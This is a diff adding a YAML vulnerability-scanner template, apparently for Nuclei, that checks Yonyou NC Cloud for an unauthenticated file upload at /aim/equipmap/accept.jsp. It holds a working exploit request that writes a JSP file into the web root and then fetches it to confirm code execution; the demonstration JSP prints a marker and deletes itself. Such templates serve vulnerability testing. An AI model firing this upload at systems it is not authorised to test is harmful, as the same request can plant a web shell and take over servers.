@@ -1,0 +1,39 @@
+id: yaml-poc-yonyou-yonyou_nc_cloud-file_upload-CT-469671
+info:
+  name: Yaml Poc Yonyou Yonyou_Nc_Cloud File_Upload Ct 469671
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-yonyou-yonyou_nc_cloud-file_upload-CT-469671'
+  tags: fileupload
+  reference:
+  - https://decoded.avast.io/janneduchal/analysis-of-attack-against-national-games-of-china-systems/
+http:
+- method: POST
+  path:
+  - /aim/equipmap/accept.jsp
+  body: "-----------------------------16314487820932200903769468567\r\nContent-Disposition:\
+    \ form-data; name=\"upload\"; filename=\"{{s1}}.txt\"\r\nContent-Type: text/plain\r\
+    \n\r\n<% out.println(\"{{s2}}\"); new java.io.File(application.getRealPath(request.getServletPath())).delete();\
+    \ %>\r\n-----------------------------16314487820932200903769468567\r\nContent-Disposition:\
+    \ form-data; name=\"fname\"\r\n\r\n\\webapps\\nc_web\\{{s3}}.jsp\r\n-----------------------------16314487820932200903769468567--"
+  headers:
+    Content-Type: multipart/form-data; boundary=---------------------------16314487820932200903769468567
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - afterUpload
+- method: GET
+  path:
+  - /{{s3}}.jsp
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
